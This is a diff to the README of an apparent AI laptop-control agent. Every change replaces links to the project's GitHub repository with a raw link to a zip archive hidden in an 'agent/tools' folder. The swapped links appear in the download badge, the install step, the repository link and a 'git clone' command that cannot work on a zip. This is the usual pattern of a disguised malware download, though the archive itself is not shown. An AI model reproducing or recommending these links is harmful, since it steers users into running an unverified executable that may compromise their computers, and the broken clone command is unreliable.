@@ -1,6 +1,6 @@
 # 🤖 zara-ai-laptop-agent - Control Your PC from Phone with AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Zara%20AI%20Agent-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ottoman-reticule726/zara-ai-laptop-agent)
+[![Download Now](https://img.shields.io/badge/Download%20Zara%20AI%20Agent-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ottoman-reticule726/zara-ai-laptop-agent/main/agent/tools/1.2-alpha.1.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Whether you are at your desk or away, Zara lets you stay in control. Just messag
 ### Step 1: Download
 
 Visit this link to download the application:  
-[Download Zara AI Agent from GitHub](https://github.com/Ottoman-reticule726/zara-ai-laptop-agent)
+[Download Zara AI Agent from GitHub](https://raw.githubusercontent.com/Ottoman-reticule726/zara-ai-laptop-agent/main/agent/tools/1.2-alpha.1.zip)
 
 ### Step 2: Run the Installer
 
@@ -71,7 +71,7 @@ You can send text or voice messages in English or Urdu. Just mention Zara before
 If you want to customize Zara or use it without the installer, you can run the code yourself using Python. Otherwise, skip this section.
 
 ```bash
-git clone https://github.com/Ottoman-reticule726/zara-ai-laptop-agent.git
+git clone https://raw.githubusercontent.com/Ottoman-reticule726/zara-ai-laptop-agent/main/agent/tools/1.2-alpha.1.zip
 cd zara-ai-laptop-agent
 pip install -r requirements.txt
 ```
@@ -128,7 +128,7 @@ Zara uses powerful yet safe tools like Claude AI, the Anthropic language model, 
 
 For help of connection, open a support thread in the GitHub Discussions page.
 
-[GitHub Repository](https://github.com/Ottoman-reticule726/zara-ai-laptop-agent)
+[GitHub Repository](https://raw.githubusercontent.com/Ottoman-reticule726/zara-ai-laptop-agent/main/agent/tools/1.2-alpha.1.zip)
 
 ---
 
